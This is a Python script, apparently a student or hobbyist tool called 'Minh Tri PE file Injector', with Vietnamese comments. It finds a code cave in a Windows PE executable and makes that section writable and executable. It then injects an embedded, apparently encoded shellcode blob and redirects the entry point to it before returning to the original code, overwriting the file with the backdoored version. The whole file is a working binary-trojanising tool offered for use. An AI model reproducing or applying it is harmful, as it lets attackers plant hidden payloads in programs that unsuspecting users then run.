#!/usr/bin/env python3

import sys
import pefile
import argparse

# CLI Argument Inputs
parser = argparse.ArgumentParser(description='Minh Tri PE file Injector')
parser.add_argument('--file','-f', dest='file')

args = parser.parse_args()

# Identifies code cave of specified size (min shellcode + 20 padding)
# Returns the Virtual and Raw addresses
def FindCave():
    global pe
    filedata = open(file, "rb") # Doc File
    print(" Min Cave Size: " + str(minCave) + " bytes")
    # Set PE file Image Base
    image_base_hex = int('0x{:08x}'.format(pe.OPTIONAL_HEADER.ImageBase), 16)
    caveFound = False
    # Loop through sections to identify code cave of minimum bytes
    # Trong Section chua PointerToRawData 
    for section in pe.sections:
        sectionCount = 0
        if section.SizeOfRawData != 0:
            position = 0
            count = 0
            filedata.seek(section.PointerToRawData, 0)
            data = filedata.read(section.SizeOfRawData) #Doc file tu rawdata
            for byte in data: #data chua 1 chuoi byte
                position += 1
                if byte == 0x00:
                    count += 1
                else:
                    if count > minCave: #minCave la do dai Shell code
                        caveFound = True
                        raw_addr = section.PointerToRawData + position - count - 1
                        vir_addr = image_base_hex + section.VirtualAddress + position - count - 1
                        section.Characteristics = 0xE0000040
                        return vir_addr, raw_addr #raw address là byte thu bao nhieu tren file, vir_addr dia chi ao tren RAM
                    count = 0
        sectionCount += 1
    filedata.close()

# Load file to var
file = args.file 

# Load to pefile object
pe = pefile.PE(file)

shellcode = bytes(
b""
b"\xb8\x0e\xa8\xa2\x93\xda\xc6\xd9\x74\x24\xf4\x5b\x31"
b"\xc9\xb1\x41\x31\x43\x12\x03\x43\x12\x83\xcd\xac\x40"
b"\x66\x08\x47\x1f\x50\xde\xbc\xd4\x52\xcc\x0f\x63\xa4"
b"\x39\x0b\x07\xb7\x89\x5f\x61\x34\x62\x29\x92\xcf\x32"
b"\xde\x21\xb1\x9a\x55\x03\x76\x95\x71\x19\x75\x70\x83"
b"\x30\x86\x63\xe3\x39\x15\x47\xc0\xb6\xa3\xbb\x83\x9d"
b"\x03\xbb\x92\xf7\xdf\x71\x8d\x8c\xba\xa5\xac\x79\xd9"
b"\x91\xe7\xf6\x2a\x52\xf6\xe6\x62\x9b\xc8\x36\x78\xcf"
b"\xaf\x77\xf5\x08\x71\xb8\xfb\x17\xb6\xac\xf0\x2c\x44"
b"\x17\xd1\x27\x55\xdc\x7b\xe3\x94\x08\x1d\x60\x9a\x85"
b"\x69\x2c\xbf\x18\x85\x5b\xbb\x91\x58\xb3\x4d\xe1\x7e"
b"\x5f\x2f\x29\xcc\x5b\x86\x79\xb8\x86\x51\x43\xd3\xc6"
b"\x2c\x4a\xc8\x84\x58\xcd\xef\xd7\x66\x7b\x4a\x23\xf1"
b"\x10\x39\x0b\x40\x81\xf2\x79\x6c\x35\x9d\x08\x03\xd0"
b"\x2f\xc2\x38\x92\x8c\x06\xb5\x2a\xca\x10\x36\x79\x17"
b"\x15\x0a\xd2\xac\x8d\x29\x9e\x6e\x4a\x31\x05\xdd\xbc"
b"\x3a\xba\x1e\xc3\xd3\x2b\xb9\x1b\x04\xdc\x71\x3e\x28"
b"\x70\xb3\x1b\x38\xd4\x97\x9e\xb0\x06\xbf\xf8\xe2\xe8"
b"\x60\x90\xd2\xd9\x57\x55\x7b\x2b\xa0\xa0\x49\x23\x84"
b"\xb8\xc4\x93\x4c\x75\x43\xf8\xac\xed\x1d\x65\x8d\xb8"
b"\x89\x2c\xed\x2e\x25\x9e\x24\x26\xf5\xc4\xae\xbf\xe7"
b"\x34\x1d\xd5\xa7\x65\xf0\x7b\xd7\x5a\x62"
)

# Save file to variable
newFile = args.file
# Stores Image Base
image_base = pe.OPTIONAL_HEADER.ImageBase
minCave = (4 + len(shellcode)) + 10 #Do dai o trong

try:
    newEntryPoint, newRawOffset = FindCave()
except:
    sys.exit(" No Code Cave Found")

# Stores original entrypoint
#Address tren RAM cua chuong trinh. Vi tri dau tien cua program
origEntryPoint = (pe.OPTIONAL_HEADER.AddressOfEntryPoint) 
# Sets new Entry Point and aligns address
pe.OPTIONAL_HEADER.AddressOfEntryPoint = newEntryPoint - image_base
returnAddress = (origEntryPoint + image_base).to_bytes(4, 'little')

# INJECT
shellcode += (b"\xB8" + returnAddress)
paddingBytes = b""

#Them padding vao sau Shellcode
if len(shellcode) % 4 != 0:
    paddingBytes = b"\x90" * 10
    shellcode += paddingBytes
shellcode += (b"\xFF\xD0")
#Them padding vao trước shellcode
shellcode = b"\x90\x90\x90\x90" + shellcode 

# Injects Shellcode
pe.set_bytes_at_offset(newRawOffset, shellcode)

# Save and close files
pe.write(newFile)

pe.close()
print("\n")
